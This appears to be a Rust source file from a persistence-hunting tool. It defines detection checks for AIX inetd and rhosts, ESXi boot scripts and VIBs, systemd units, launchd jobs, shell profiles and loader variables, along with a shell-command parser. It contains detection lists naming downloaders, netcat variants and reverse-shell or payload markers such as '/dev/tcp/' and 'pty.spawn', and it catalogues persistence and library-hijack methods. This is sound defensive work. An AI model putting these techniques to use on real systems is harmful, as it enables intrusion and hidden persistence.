    chk(
        "aix-inetd-suspicious-command",
        "aix-inetd-conf",
        "T1543",
        PERSIST,
        High,
        "inetd service runs a suspicious command",
        |r| {
            let command = format!("{} {}", text(r, "program"), text(r, "arguments"));
            suspicious_command(&command).map(|why| format!("{}: {why}: {command}", text(r, "service")))
        },
    ),
    chk("aix-inetd-shell-service", "aix-inetd-conf", "T1059.004", "Execution", High, "inetd service is a shell", |r| {
        let shell =
            ["sh", "ksh", "ksh93", "bsh", "csh", "bash", "rksh"].contains(&base_name(text(r, "program")).as_str());
        shell.then(|| format!("{} runs {} {}", text(r, "service"), text(r, "program"), text(r, "arguments")))
    }),
    chk(
        "aix-rhosts-wildcard",
        "aix-rhosts",
        "T1021",
        "Lateral Movement",
        High,
        "Remote-trust file trusts every host or user",
        |r| {
            (r["wildcard"] == true && r["denied"] != true).then(|| {
                format!("{}: {} {}", text(r, "source_path"), text(r, "peer"), r["user"].as_str().unwrap_or(""))
            })
        },
    ),
    chk(
        "aix-rhosts-user-file",
        "aix-rhosts",
        "T1021",
        "Lateral Movement",
        Medium,
        ".rhosts grants remote login",
        |r| {
            (text(r, "file") == ".rhosts" && r["denied"] != true).then(|| {
                format!("{} trusts {} {}", text(r, "source_path"), text(r, "peer"), r["user"].as_str().unwrap_or(""))
            })
        },
    ),
    chk(
        "aix-loader-hijack",
        "shell-profiles",
        "T1574.006",
        PERSIST,
        High,
        "Session environment sets LDR_PRELOAD or a temporary LIBPATH",
        |r| aix_loader_hijack(text(r, "text")),
    ),
    chk(
        "aix-kernel-extension-in-temp",
        "aix-genkex",
        "T1547.006",
        PERSIST,
        High,
        "Kernel extension loaded from a temporary directory",
        |r| starts_with_temp(text(r, "path")).then(|| format!("{} at {}", text(r, "path"), text(r, "address"))),
    ),
    chk(
        "esxi-rc-local-command",
        "esxi-rc-local",
        "T1037.004",
        PERSIST,
        Medium,
        "ESXi rc.local.d script runs a command at boot",
        |r| {
            let line = text(r, "text").trim();
            // The stock local.sh is comments and `exit 0`; the comments are not records.
            (line != "exit 0").then(|| line.to_string())
        },
    ),
    chk(
        "esxi-rc-local-suspicious",
        "esxi-rc-local",
        "T1037.004",
        PERSIST,
        High,
        "ESXi rc.local.d script runs a suspicious command",
        |r| susp(r, "text"),
    ),
    chk(
        "esxi-rc-local-unexpected-file",
        "esxi-rc-local-files",
        "T1037.004",
        PERSIST,
        Medium,
        "Unexpected file in ESXi /etc/rc.local.d",
        esxi_rc_local_file,
    ),
    chk(
        "esxi-vib-community",
        "esxi-vib",
        "T1543",
        PERSIST,
        Medium,
        "VIB with the community acceptance level (not signed by VMware or a partner)",
        esxi_community,
    ),
    chk(
        "esxi-vib-community",
        "esxi-vib-list",
        "T1543",
        PERSIST,
        Medium,
        "VIB with the community acceptance level (not signed by VMware or a partner)",
        esxi_community,
    ),
    chk(
        "esxi-vib-startup-file",
        "esxi-vib",
        "T1037.004",
        PERSIST,
        High,
        "VIB installs a startup script or scheduled job",
        esxi_vib_startup,
    ),
    chk(
        "esxi-admin-permission",
        "esxi-permissions",
        "T1098",
        PERSIST,
        Medium,
        "Local ESXi account or group with the Administrator role",
        esxi_admin,
    ),
    chk(
        "esxi-ssh-at-boot",
        "esxi-host-config",
        "T1133",
        PERSIST,
        Low,
        "SSH or the ESXi Shell is set to start with the host",
        |r| {
            let key = text(r, "key");
            let service = key.rsplit_once("/service/").map(|(_, name)| name)?;
            (["TSM-SSH", "TSM"].contains(&service) && text(r, "value") == "on")
                .then(|| format!("{service} starts with the host"))
        },
    ),
];

#[path = "hunt_solaris.rs"]
mod solaris;

/// AIX's loader variables: `LDR_PRELOAD` and `LDR_PRELOAD64` (the `LD_PRELOAD` of AIX) set to
/// anything, or `LIBPATH` with a directory an unprivileged user can write to.
fn aix_loader_hijack(line: &str) -> Option<String> {
    let (name, values) = env_assignment(line)?;
    let hit = match name.as_str() {
        "LDR_PRELOAD" | "LDR_PRELOAD64" => values.iter().any(|v| !v.is_empty()),
        "LIBPATH" => values.iter().flat_map(|v| v.split(':')).any(starts_with_temp),
        _ => false,
    };
    hit.then(|| format!("sets {name}={}", values.join(" ")))
}

/// An `inittab` command whose program is an absolute path outside the system directories
/// (`/etc`, `/usr`, `/sbin`, `/bin`, `/opt`, `/lib`, `/var/opt`). There is no list of AIX's stock
/// entries behind this: it only says the program is not where AIX and its products install.
fn aix_inittab_nonsystem(record: &Value) -> Option<String> {
    let command = text(record, "command").trim();
    if command.is_empty() || text(record, "action") == "initdefault" {
        return None;
    }
    let program = command
        .split_whitespace()
        .find(|w| !matches!(*w, "exec" | "nohup" | "nice") && !w.contains('=') && !w.starts_with('-'))?;
    let program = program.trim_start_matches(['"', '\'']);
    let system = ["/etc/", "/usr/", "/sbin/", "/bin/", "/opt/", "/lib/", "/var/opt/"];
    (program.starts_with('/') && !system.iter().any(|d| program.starts_with(d)))
        .then(|| format!("{} ({}): {command}", text(record, "id"), text(record, "action")))
}

/// What a stock ESXi image keeps in `etc/rc.local.d`; /etc/rc.local runs every other executable
/// file in the folder at boot.
fn esxi_rc_local_file(r: &Value) -> Option<String> {
    let path = text(r, "source_path");
    let stock = path == "etc/rc.local.d/local.sh"
        || path == "etc/rc.local.d/kickstart.py"
        || path == "etc/rc.local.d/cleanupStatefulHost.py"
        || path.starts_with("etc/rc.local.d/autodeploy/");
    let mode = u32::from_str_radix(text(r, "mode"), 8).unwrap_or(0);
    // A mode of 0 means the collection did not record one: the file may run.
    let runs = mode == 0 || mode & 0o111 != 0;
    (!stock && runs && !path.rsplit('/').next().unwrap_or_default().starts_with('.'))
        .then(|| format!("{path} runs at boot (mode {mode:o})"))
}

fn esxi_community(r: &Value) -> Option<String> {
    let level = text(r, "acceptance_level");
    ["community", "CommunitySupported"]
        .contains(&level)
        .then(|| format!("{} {} ({level})", text(r, "name"), text(r, "version")))
}

fn esxi_vib_startup(r: &Value) -> Option<String> {
    let files = r["files"].as_array()?;
    let starts = ["etc/init.d/", "etc/rc.local.d/", "var/spool/cron/", "etc/cron"];
    let hit = files
        .iter()
        .filter_map(Value::as_str)
        .find(|f| starts.iter().any(|p| f.trim_start_matches('/').starts_with(p)))?;
    Some(format!("{} installs {hit}", text(r, "name")))
}

fn esxi_admin(r: &Value) -> Option<String> {
    let user = text(r, "user");
    let group = r["is_group"] == true;
    let default = !group && ["root", "dcui", "vpxuser"].contains(&user);
    // -1 is the built-in Administrator role.
    (r["role_id"] == -1 && !default && !user.is_empty()).then(|| {
        format!("{} {user} is an administrator of {}", if group { "group" } else { "account" }, text(r, "entity"))
    })
}

/// A string field of a record; empty when the field is missing or not text.
pub fn text<'a>(record: &'a Value, field: &str) -> &'a str {
    record.get(field).and_then(Value::as_str).unwrap_or("")
}

fn susp(record: &Value, field: &str) -> Option<String> {
    let command = text(record, field);
    suspicious_command(command).map(|why| format!("{why}: {command}"))
}

fn script_writable(record: &Value) -> Option<String> {
    let mode = u32::from_str_radix(text(record, "mode"), 8).ok()?;
    let mut why = Vec::new();
    if mode & 0o020 != 0 {
        why.push("group-writable".to_string());
    }
    if mode & 0o002 != 0 {
        why.push("world-writable".to_string());
    }
    if record["uid"].as_u64().is_some_and(|uid| uid != 0) {
        why.push(format!("owned by uid {}", record["uid"]));
    }
    (!why.is_empty()).then(|| format!("{} (mode {mode:o})", why.join(", ")))
}

const SYSTEMD_EXEC: [&str; 5] = ["exec_start", "exec_start_pre", "exec_start_post", "exec_stop", "exec_reload"];

fn systemd_exec(record: &Value) -> Option<String> {
    SYSTEMD_EXEC
        .iter()
        .find_map(|field| susp(record, field).map(|detail| format!("{field} {detail}{}", unit_state(record))))
}

/// What the first pass knew about the unit: ` [enabled: wanted by multi-user.target]`,
/// ` [masked]`, ` [not enabled]`, or nothing when no enablement link was collected.
fn unit_state(record: &Value) -> String {
    let joined = &record["joined"];
    match joined["enablement"].as_str() {
        Some("enabled") => {
            let by: Vec<&str> =
                joined["enabled_by"].as_array().into_iter().flatten().filter_map(Value::as_str).collect();
            let lingers = if joined["owner_lingers"].is_string() { "; owner lingers" } else { "" };
            format!(" [enabled: {}{lingers}]", by.join(", "))
        }
        Some("masked") => " [masked]".to_string(),
        Some("not-enabled") => " [not enabled]".to_string(),
        _ => String::new(),
    }
}

/// A timer, socket or path unit (`kind`) whose service runs a suspicious command: the detail
/// names the service and the command it starts.
fn activated_exec(record: &Value, kind: &str) -> Option<String> {
    if text(record, "unit_type") != kind {
        return None;
    }
    let starts = &record["joined"]["starts"];
    let detail = systemd_exec(starts)?;
    Some(format!("{kind} -> {}{}: {detail}", text(starts, "unit"), unit_state(record)))
}

/// A wants/requires/alias link whose target is not in a unit directory. Targets are text and
/// are resolved lexically against the link's own directory, never on a file system.
fn enablement_outside_unit_dirs(record: &Value) -> Option<String> {
    if !["wants", "requires", "upholds", "link"].contains(&text(record, "kind")) {
        return None;
    }
    let (target, path) = (text(record, "target"), text(record, "source_path"));
    let mut parts: Vec<&str> = Vec::new();
    if !target.starts_with('/') {
        parts.extend(path.rsplit_once('/').map_or("", |(dir, _)| dir).split('/'));
    }
    let mut escapes = false;
    for part in target.split('/') {
        match part {
            "" | "." => {}
            // More `..` than directories: it points out of the host root.
            ".." => escapes |= parts.pop().is_none(),
            part => parts.push(part),
        }
    }
    let resolved = parts.join("/");
    let unit_dirs = ["etc/systemd/", "usr/lib/systemd/", "lib/systemd/", "usr/local/lib/systemd/", "run/systemd/"];
    let user_dirs = [".config/systemd/user/", ".local/share/systemd/user/"];
    let usual = !escapes
        && (unit_dirs.iter().any(|d| resolved.starts_with(d))
            || (text(record, "scope") == "user" && user_dirs.iter().any(|d| resolved.contains(d))));
    (!target.is_empty() && !usual).then(|| format!("{} links to {target}", text(record, "unit")))
}

fn shell_profile(record: &Value) -> Option<String> {
    let line = text(record, "text");
    // `/etc/environment` holds `NAME=value` pairs, not shell code: `environment-*` checks read it.
    if line.trim_start().starts_with('#') || text(record, "source_path") == "etc/environment" {
        return None;
    }
    // OpenBSD's stock `etc/ksh.kshrc` aliases `su` to its xterm-title wrapper.
    if text(record, "source_path") == "etc/ksh.kshrc" && line.trim() == "alias su=wsu" {
        return None;
    }
    susp(record, "text").or_else(|| {
        ["LD_PRELOAD=", "alias sudo=", "alias su="]
            .iter()
            .find(|needle| line.contains(**needle))
            .map(|needle| format!("sets {needle}: {line}"))
            .or_else(|| prompt_command_runs_code(line).then(|| format!("sets PROMPT_COMMAND=: {line}")))
    })
}

/// A word of shell: its text with the quotes removed, and the rest of the input after it. The
/// word ends at an unquoted blank, `;`, `&`, `|` or `)`.
fn shell_word(input: &str) -> (String, &str) {
    let (mut word, mut quote) = (String::new(), None);
    let mut chars = input.char_indices();
    while let Some((i, c)) = chars.next() {
        match (quote, c) {
            (None, '"' | '\'') => quote = Some(c),
            (Some(q), c) if c == q => quote = None,
            (Some('"'), '\\') => {
                word.push(c);
                if let Some((_, next)) = chars.next() {
                    word.push(next);
                }
            }
            (None, c) if c.is_whitespace() || [';', '&', '|', ')'].contains(&c) => return (word, &input[i..]),
            (_, c) => word.push(c),
        }
    }
    (word, "")
}

/// True when a `PROMPT_COMMAND` assignment in `line` sets something that runs code the way
/// an attacker would use it. A value is ordinary when every statement of it only prints a
/// prompt or title (`printf`, `echo`, without redirection or substitution), assigns a variable, expands the previous value, or is one of the three scripts and the one
/// function that distributions name (`/etc/sysconfig/bash-prompt-*`, `__vte_prompt_command`).
/// The assigned text is read the way the shell reads it, so a title built from quoted pieces
/// is one value. Anything else (a program, a path, `$(...)`) is reported.
fn prompt_command_runs_code(line: &str) -> bool {
    line.match_indices("PROMPT_COMMAND").any(|(at, _)| {
        let before = &line[..at];
        let after = &line[at + "PROMPT_COMMAND".len()..];
        let assigned = after.strip_prefix("+=").or_else(|| after.strip_prefix('='));
        let (Some(value), false) = (assigned, before.ends_with(|c: char| c.is_ascii_alphanumeric() || c == '_')) else {
            return false;
        };
        // `PROMPT_COMMAND=(a b)` and `+=(a)` are arrays: every element is a command.
        let Some(mut elements) = value.strip_prefix('(') else {
            return !ordinary_prompt_value(&shell_word(value).0);
        };
        loop {
            elements = elements.trim_start();
            if elements.is_empty() || elements.starts_with(')') {
                return false;
            }
            let (element, rest) = shell_word(elements);
            // A word that stops at once (a stray `;` or `&`) is not an element: report the line
            // rather than loop on it.
            if rest.len() == elements.len() || !ordinary_prompt_value(&element) {
                return true;
            }
            elements = rest;
        }
    })
}

fn ordinary_prompt_value(value: &str) -> bool {
    if value.contains(['`', '<', '>']) || value.contains("$(") {
        return false;
    }
    // `()` clears the array; an empty value unsets the variable.
    if value.is_empty() || value == "()" {
        return true;
    }
    split_statements(value).iter().all(|statement| {
        let (word, rest) = shell_word(statement);
        let (word, rest) = if word.is_empty() { (String::new(), "") } else { (word, rest) };
        match word.as_str() {
            "printf"
            | "echo"
            | "true"
            | ":"
            | "$PROMPT_COMMAND"
            | "${PROMPT_COMMAND}"
            | "__vte_prompt_command"
            | "/etc/sysconfig/bash-prompt-xterm"
            | "/etc/sysconfig/bash-prompt-screen"
            | "/etc/sysconfig/bash-prompt-default" => true,
            // `NAME=value` only assigns; the value was checked for substitution above.
            w => is_assignment(w) && rest.trim().is_empty(),
        }
    })
}

/// The statements of a shell string: split at `;`, `&`, `|` and newlines that are not quoted.
fn split_statements(text: &str) -> Vec<&str> {
    let (mut out, mut quote, mut start) = (Vec::new(), None, 0);
    let mut chars = text.char_indices();
    while let Some((i, c)) = chars.next() {
        match (quote, c) {
            (None, '"' | '\'') => quote = Some(c),
            (Some(q), c) if c == q => quote = None,
            (Some('"'), '\\') | (None, '\\') => {
                chars.next();
            }
            (None, ';' | '&' | '|' | '\n') => {
                out.push(text[start..i].trim());
                start = i + 1;
            }
            _ => {}
        }
    }
    out.push(text[start..].trim());
    out.retain(|s| !s.is_empty());
    out
}

/// What a variable assignment in `/etc/environment`, `pam_env.conf` or `environment.d` sets:
/// `NAME=value`, `export NAME=value`, or pam_env's `NAME DEFAULT=value OVERRIDE=value`.
fn env_assignment(line: &str) -> Option<(String, Vec<String>)> {
    let line = line.trim().strip_prefix("export ").unwrap_or(line.trim());
    let unquote = |v: &str| v.trim().trim_matches(['"', '\'']).to_string();
    if let Some((name, value)) = line.split_once('=').filter(|(n, _)| !n.contains(char::is_whitespace)) {
        return Some((name.to_string(), vec![unquote(value)]));
    }
    let (name, rest) = line.split_once(char::is_whitespace)?;
    let values: Vec<String> = rest
        .split_whitespace()
        .filter_map(|w| w.strip_prefix("DEFAULT=").or_else(|| w.strip_prefix("OVERRIDE=")))
        .map(unquote)
        .collect();
    (!values.is_empty()).then(|| (name.to_string(), values))
}

/// `LD_PRELOAD` or `LD_AUDIT` set to anything, or `LD_LIBRARY_PATH` with a directory an
/// unprivileged user can write to.
fn env_library_hijack(line: &str) -> Option<String> {
    let (name, values) = env_assignment(line)?;
    let hit = match name.as_str() {
        "LD_PRELOAD" | "LD_AUDIT" => values.iter().any(|v| !v.is_empty()),
        "LD_LIBRARY_PATH" => values.iter().flat_map(|v| v.split(':')).any(starts_with_temp),
        _ => false,
    };
    hit.then(|| format!("sets {name}={}", values.join(" ")))
}

/// A `PATH` entry that is empty or `.` (the current directory), temporary, or hidden.
fn env_path_hijack(line: &str) -> Option<String> {
    let (name, values) = env_assignment(line)?;
    if name != "PATH" {
        return None;
    }
    let risky = |dir: &str| {
        let hidden = dir.split('/').any(|part| {
            let name = part.strip_prefix('.').unwrap_or("");
            name.starts_with(|c: char| c.is_ascii_alphanumeric() || c == '_') && !BENIGN_HIDDEN.contains(&name)
        });
        dir == "." || starts_with_temp(dir) || hidden
    };
    // A leading or doubled `:` is an empty entry, which means the current directory.
    let empty = |v: &str| !v.is_empty() && (v.starts_with(':') || v.ends_with(':') || v.contains("::"));
    values.iter().any(|v| empty(v) || v.split(':').any(risky)).then(|| format!("sets PATH={}", values.join(" ")))
}

/// The one `pam_exec` line a distribution ships: Debian 8's `pam.d/login` prints `uname`
/// at login. Options are skipped; what runs must be exactly that command.
fn stock_pam_exec(arguments: &str) -> bool {
    let words: Vec<&str> = arguments.split_whitespace().collect();
    let options = ["quiet", "stdout", "type=open_session", "type=close_session"];
    let command: Vec<&str> = words.iter().copied().skip_while(|w| options.contains(w)).collect();
    command == ["/bin/uname", "-snrvm"]
}

/// A modprobe `install` command made only of what distributions ship in `modprobe.d`: `modprobe`
/// of module names (a path would load a file), `true`/`false`, `sysctl` of `net.` settings, and
/// the `mount -t <fs>` of `rpc_pipefs`, `nfsd` and `binfmt_misc` below `/proc` or `/var/lib/nfs`.
fn stock_modprobe_command(args: &str) -> bool {
    // Brace groups as words (`${VAR}` is not one), and the one redirection shipped: output to /dev/null.
    let words: Vec<&str> =
        args.split_whitespace().map(|w| if w == "{" || w == "}" || w == "};" { ";" } else { w }).collect();
    let flat = words.join(" ").replace("> /dev/null 2>&1", "");
    if flat.contains(['`', '<', '>', '\\']) || flat.contains("$(") {
        return false;
    }
    let statements: Vec<&str> = flat.split([';', '&', '|']).map(str::trim).filter(|s| !s.is_empty()).collect();
    let stock = |statement: &str| {
        let words: Vec<&str> = statement.split_whitespace().collect();
        let Some((program, args)) = words.split_first() else { return false };
        let in_system_dir = ["/bin/", "/sbin/", "/usr/bin/", "/usr/sbin/"].iter().any(|d| program.starts_with(d));
        let name = if in_system_dir { program.rsplit('/').next().unwrap_or("") } else { *program };
        match name {
            "true" | "false" | ":" => in_system_dir || !program.contains('/'),
            "modprobe" => in_system_dir && !args.iter().any(|a| a.contains('/')),
            "sysctl" => {
                in_system_dir
                    && args.iter().all(|a| a.starts_with('-') || a.trim_matches(['\'', '"']).starts_with("net"))
            }
            "mount" => {
                in_system_dir
                    && matches!(args, ["-t", fs, _, point] if ["rpc_pipefs", "nfsd", "binfmt_misc"].contains(fs)
                        && (point.starts_with("/proc/") || point.starts_with("/var/lib/nfs/")))
            }
            _ => false,
        }
    };
    !statements.is_empty() && statements.iter().all(|s| stock(s))
}

fn modprobe_install(record: &Value) -> Option<String> {
    let args = text(record, "arguments").trim();
    (text(record, "kind") == "install" && !args.is_empty() && !stock_modprobe_command(args))
        .then(|| format!("install {}: {args}", text(record, "module")))
}

/// The program of a launchd job: `Program`, or the first `ProgramArguments` entry.
fn launchd_program(record: &Value) -> &str {
    match text(record, "program") {
        "" => record["program_arguments"][0].as_str().unwrap_or(""),
        program => program,
    }
}

/// What a launchd job runs: `Program`, then `ProgramArguments` after the first (which `Program`
/// replaces); with no `Program`, the `ProgramArguments`.
fn launchd_command(record: &Value) -> String {
    let args: Vec<&str> =
        record["program_arguments"].as_array().into_iter().flatten().filter_map(Value::as_str).collect();
    match text(record, "program") {
        "" => args.join(" "),
        program => std::iter::once(program).chain(args.iter().skip(1).copied()).collect::<Vec<_>>().join(" "),
    }
}

fn launchd_exec(record: &Value, scope_suffix: &str) -> Option<String> {
    if !text(record, "scope").ends_with(scope_suffix) {
        return None;
    }
    let line = launchd_command(record);
    suspicious_command(&line)
        .or_else(|| has_word(&line, "curl").then_some("runs curl from a launchd job"))
        .map(|why| format!("{why}: {}", line.trim()))
}

/// The fields of a record that hold something to run or a path to it: the text the checks
/// look at. A profile's `allow` `contains` is matched against these (and the finding's
/// detail), never against the whole record, where an attacker could plant the allowed text
/// in a field that does not matter (such as `StandardOutPath`).
const EXEC_FIELDS: [&str; 16] = [
    "command",
    "program",
    "program_arguments",
    "arguments",
    "exec",
    "exec_start",
    "exec_start_pre",
    "exec_start_post",
    "exec_stop",
    "exec_reload",
    "text",
    "path",
    "executable",
    "executable_path",
    "forced_command",
    "module",
];

/// The text of [`EXEC_FIELDS`] in a record, one field per line.
pub fn executable_text(record: &Value) -> String {
    let mut out = String::new();
    for field in EXEC_FIELDS {
        match &record[field] {
            Value::String(s) => out.push_str(s),
            Value::Array(items) => out.push_str(&items.iter().filter_map(Value::as_str).collect::<Vec<_>>().join(" ")),
            _ => continue,
        }
        out.push('\n');
    }
    out
}

/// Directories anyone can write to (compared in lower case, after the path is resolved).
const TEMP_DIRS: [&str; 6] = ["/tmp", "/var/tmp", "/dev/shm", "/private/tmp", "/private/var/tmp", "/users/shared"];
/// Hidden names (without the dot) that are ordinary in commands and shell startup files.
const BENIGN_HIDDEN: [&str; 24] = [
    "config",
    "local",
    "cache",
    "ssh",
    "gnupg",
    "cargo",
    "rustup",
    "nvm",
    "pyenv",
    "rbenv",
    "bashrc",
    "bash_profile",
    "bash_login",
    "bash_logout",
    "bash_aliases",
    "profile",
    "zshrc",
    "zprofile",
    "zshenv",
    "inputrc",
    "dircolors",
    "well-known",
    "dockerenv",
    "oh-my-zsh",
];
const SHELLS: [&str; 5] = ["sh", "bash", "zsh", "dash", "ksh"];
const INTERPRETERS: [&str; 9] = ["sh", "bash", "zsh", "dash", "ksh", "perl", "ruby", "php", "node"];
/// Commands that run the command that follows them.
const WRAPPERS: [&str; 13] = [
    "sudo",
    "doas",
    "nohup",
    "exec",
    "env",
    "setsid",
    "nice",
    "ionice",
    "timeout",
    "command",
    "time",
    "caffeinate",
    "arch",
];
/// Words that start a shell statement without being the command.
const KEYWORDS: [&str; 8] = ["if", "then", "else", "elif", "do", "while", "until", "!"];
// `fetch` is FreeBSD's downloader and `ftp -o - URL` is OpenBSD's and NetBSD's.
const FETCHERS: [&str; 4] = ["curl", "wget", "fetch", "ftp"];
const NETCATS: [&str; 3] = ["nc", "ncat", "netcat"];
/// Code given to an inline interpreter that talks to the network or unpacks a payload.
const INLINE_PAYLOAD: [&str; 8] =
    ["socket", "/dev/tcp/", "pty.spawn", "urlopen", "b64decode", "base64", "fromhex", "decompress"];

/// `/a//b/./c/../d` to `/a/b/d`. Relative paths are returned as they are.
fn resolve_path(path: &str) -> String {
    if !path.starts_with('/') {
        return path.to_string();
    }
    let mut parts: Vec<&str> = Vec::new();
    for part in path.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            part => parts.push(part),
        }
    }
    format!("/{}", parts.join("/"))
}

/// True for a path in a world-writable or temporary directory: the system temp directories,
/// `/Users/Shared`, and macOS per-user `/var/folders/xx/yyyy/T`. Case does not matter (the
/// default macOS volume ignores it) and `//`, `/./` and `/../` are resolved first.
fn starts_with_temp(path: &str) -> bool {
    let path = resolve_path(path).to_ascii_lowercase();
    if TEMP_DIRS.iter().any(|dir| path == *dir || path.strip_prefix(dir).is_some_and(|rest| rest.starts_with('/'))) {
        return true;
    }
    let folders = path.strip_prefix("/private").unwrap_or(&path).strip_prefix("/var/folders/");
    folders.is_some_and(|rest| rest.split('/').nth(2) == Some("t"))
}

/// `needle` at the start of a word: `nc ` matches in `nc -e` but not in `rsync `.
fn has_word(command: &str, needle: &str) -> bool {
    command.match_indices(needle).any(|(i, _)| !command[..i].ends_with(|c: char| c.is_ascii_alphanumeric() || c == '_'))
}

/// The file name of a command word, lower-cased, without systemd's `-@+!:` prefixes.
fn base_name(word: &str) -> String {
    let word = word.trim_start_matches(['-', '@', '+', '!', ':']);
    word.rsplit('/').next().unwrap_or("").to_ascii_lowercase()
}

fn is_interpreter(word: &str) -> bool {
    let name = base_name(word);
    INTERPRETERS.contains(&name.as_str()) || name.starts_with("python")
}

fn is_assignment(word: &str) -> bool {
    word.split_once('=')
        .is_some_and(|(name, _)| !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'))
}

/// One simple command of a command line.
struct Segment {
    /// Joined to the previous segment by a single `|`.
    piped: bool,
    words: Vec<String>,
}

impl Segment {
    /// Index of the command word: after assignments, wrappers (`sudo -E`, `env`) and keywords.
    fn command_index(&self) -> Option<usize> {
        let mut i = 0;
        while let Some(word) = self.words.get(i) {
            let name = base_name(word);
            if is_assignment(word) || KEYWORDS.contains(&word.as_str()) {
                i += 1;
            } else if WRAPPERS.contains(&name.as_str()) {
                i += 1;
                // Options and a leading duration (`timeout 5`) belong to the wrapper.
                while let Some(next) = self.words.get(i) {
                    let option = next.starts_with('-');
                    if option || next.chars().all(|c| c.is_ascii_digit()) || is_assignment(next) {
                        // `sudo -u root`: the option takes a value.
                        i += 1 + usize::from(option && ["-u", "-g", "-h", "-p", "-C"].contains(&next.as_str()));
                    } else {
                        break;
                    }
                }
            } else {
                return Some(i);
            }
        }
        None
    }

    fn command(&self) -> Option<&str> {
        self.command_index().map(|i| self.words[i].as_str())
    }

    fn name(&self) -> String {
        self.command().map(base_name).unwrap_or_default()
    }

    /// The words after the command word.
    fn args(&self) -> &[String] {
        self.command_index().map_or(&[], |i| &self.words[i + 1..])
    }

    /// The script an interpreter runs: its first argument that is not an option.
    fn script(&self) -> Option<&str> {
        let command = self.command()?;
        is_interpreter(command).then(|| self.args().iter().find(|w| !w.starts_with('-')).map(String::as_str))?
    }

    /// The file this segment runs: the command, or the script an interpreter is given.
    fn runs(&self) -> impl Iterator<Item = &str> {
        let command = self.command().filter(|c| c.contains('/') || c.starts_with("./"));
        command.into_iter().chain(self.script())
    }
}

/// Brace lists as shells expand them: `{echo,hi}` is `echo hi`.
fn expand_braces(text: &str) -> String {
    let mut out = String::new();
    let mut rest = text;
    while let Some(open) = rest.find('{') {
        let list = rest[open + 1..].split_once('}').map(|(inner, _)| inner);
        match list.filter(|l| l.contains(',') && !l.contains([' ', '$', '{'])) {
            Some(list) => {
                out.push_str(&rest[..open]);
                out.push(' ');
                out.push_str(&list.replace(',', " "));
                out.push(' ');
                rest = &rest[open + list.len() + 2..];
            }
            None => {
                out.push_str(&rest[..=open]);
                rest = &rest[open + 1..];
            }
        }
    }
    out.push_str(rest);
    out
}

/// A command line as simple commands: the comment cut off, quotes removed (so the command of
/// `sh -c "cd /tmp; ./x"` is read like any other), `${IFS}` read as a space, and split at
/// `; | & ( )`. `sh -c` is split once more, so its string is a command of its own.
fn segments(command: &str) -> Vec<Segment> {
    let mut text = command.replace("${IFS}", " ").replace("$IFS", " ").replace('\n', ";");
    if let Some((at, _)) =
        text.char_indices().find(|&(i, c)| c == '#' && (i == 0 || text[..i].ends_with([' ', '\t', ';'])))
    {
        text.truncate(at);
    }
    let text = expand_braces(&text).replace(['"', '\''], "");
    let (mut out, mut piped, mut current) = (Vec::new(), false, String::new());
    let chars: Vec<char> = text.chars().collect();
    let flush = |current: &mut String, piped: bool, out: &mut Vec<Segment>| {
        let words: Vec<String> = current.split_whitespace().map(str::to_string).collect();
        if !words.is_empty() {
            out.push(Segment { piped, words });
        }
        current.clear();
    };
    for (i, &c) in chars.iter().enumerate() {
        let redirect = c == '&' && (i > 0 && chars[i - 1] == '>' || chars.get(i + 1) == Some(&'>'));
        match c {
            '|' if chars.get(i + 1) != Some(&'|') && (i == 0 || chars[i - 1] != '|') => {
                flush(&mut current, piped, &mut out);
                piped = true;
            }
            // `$(` and `<(` stay in the word: `runs_substitution` looks for them.
            '(' if i > 0 && (chars[i - 1] == '$' || chars[i - 1] == '<') => current.push(c),
            ';' | '|' | '&' | '(' | ')' if !redirect => {
                flush(&mut current, piped, &mut out);
                piped = false;
            }
            c => current.push(c),
        }
    }
    flush(&mut current, piped, &mut out);
    // csh `foreach name (word list)`: the list is data, and the word after `(` is not a command.
    let mut after_foreach = false;
    out.retain(|s| {
        let skip = after_foreach;
        after_foreach = s.words.first().is_some_and(|w| w == "foreach");
        !skip
    });
    split_shell_c(out)
}

/// `sh -c cd /tmp` becomes `sh -c` and `cd /tmp`.
fn split_shell_c(segments: Vec<Segment>) -> Vec<Segment> {
    let mut out = Vec::new();
    for mut segment in segments {
        loop {
            let at = segment.command_index().filter(|_| SHELLS.contains(&segment.name().as_str())).and_then(|i| {
                let options = segment.words[i + 1..].iter().take_while(|w| w.starts_with('-'));
                options.enumerate().find(|(_, w)| !w.starts_with("--") && w.ends_with('c')).map(|(n, _)| i + 1 + n)
            });
            let Some(at) = at.filter(|&at| at + 1 < segment.words.len()) else { break };
            let rest = segment.words.split_off(at + 1);
            out.push(segment);
            segment = Segment { piped: false, words: rest };
        }
        out.push(segment);
    }
    out
}

fn is_fetch(segment: &Segment) -> bool {
    FETCHERS.contains(&segment.name().as_str())
}

/// True when a program or script runs from a temporary directory, including a relative one
/// after `cd` into it.
fn runs_from_temp(segments: &[Segment]) -> bool {
    let mut in_temp = false;
    segments.iter().any(|segment| {
        if segment.name() == "cd" {
            in_temp = segment.args().iter().find(|w| !w.starts_with('-')).is_some_and(|dir| starts_with_temp(dir));
            return false;
        }
        segment.runs().any(|file| {
            let file = file.trim_start_matches(['-', '@', '+', '!', ':']);
            starts_with_temp(file) || (in_temp && file.starts_with("./"))
        })
    })
}

/// True when a line starts inside a word list: `"$HOME/.dircolors"; do` is the rest of a `for`
/// header, whose first word is a value and not a command. Lines are read one at a time.
fn is_list_continuation(command: &str, segments: &[Segment]) -> bool {
    let starts_with_expansion = segments.first().and_then(Segment::command).is_some_and(|c| c.starts_with('$'));
    let continued = command.trim_end().ends_with('\\')
        || segments.get(1).is_some_and(|s| ["do", "then"].contains(&s.words[0].as_str()));
    starts_with_expansion && continued
}

/// True when a program or script has a hidden directory or file name in its path. Only the
/// command word and an interpreter's script count: `source ~/.fzf.bash` reads a dotfile,
/// it does not run one.
fn runs_hidden_path(segments: &[Segment], skip_first: bool) -> bool {
    segments.iter().skip(usize::from(skip_first)).any(|segment| {
        segment.runs().any(|file| {
            file.split('/').any(|part| {
                let name = part.strip_prefix('.').unwrap_or("");
                name.starts_with(|c: char| c.is_ascii_alphanumeric() || c == '_') && !BENIGN_HIDDEN.contains(&name)
            })
        })
    })
}

/// A mode argument that makes a file executable (`+x`, `755`).
fn makes_executable(mode: &str) -> bool {
    if mode.chars().all(|c| c.is_ascii_digit()) {
        return !mode.is_empty() && mode.bytes().rev().take(3).any(|d| (d - b'0') & 1 == 1);
    }
    mode.split_once('+').is_some_and(|(_, bits)| bits.contains('x'))
}

